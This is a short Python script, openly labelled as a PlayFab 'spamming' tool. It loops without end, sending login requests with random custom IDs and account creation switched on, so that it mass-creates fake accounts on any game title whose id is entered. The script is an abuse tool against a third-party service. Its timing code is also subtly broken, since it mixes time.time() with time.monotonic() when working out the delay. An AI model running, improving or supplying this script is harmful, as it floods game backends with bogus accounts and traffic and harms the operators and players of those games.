import time
import uuid
import requests
import msvcrt

minpfint = 0.05

titleid = input("playfab title id: ").strip()
url = f"https://{titleid}.playfabapi.com/Client/LoginWithCustomId"

print("playfab spamming, h to stop")

while True:
    start = time.time()

    if msvcrt.kbhit() and msvcrt.getch().lower() == b"h":
        print("stopped")
        break

    payload = {
        "TitleId": titleid,
        "CustomId": str(uuid.uuid4()),
        "CreateAccount": True,
    }

    ok = False
    for _ in range(2):
        try:
            r = requests.post(url, json=payload, timeout=10)
            ok = (
                r.status_code == 200
                and "SessionTicket" in r.json().get("data", {})
            )
            if ok:
                break
        except Exception:
            pass

    print("1 account made" if ok else "failed")

    elapsed = time.monotonic() - start
    if elapsed < minpfint:
        time.sleep(minpfint - elapsed)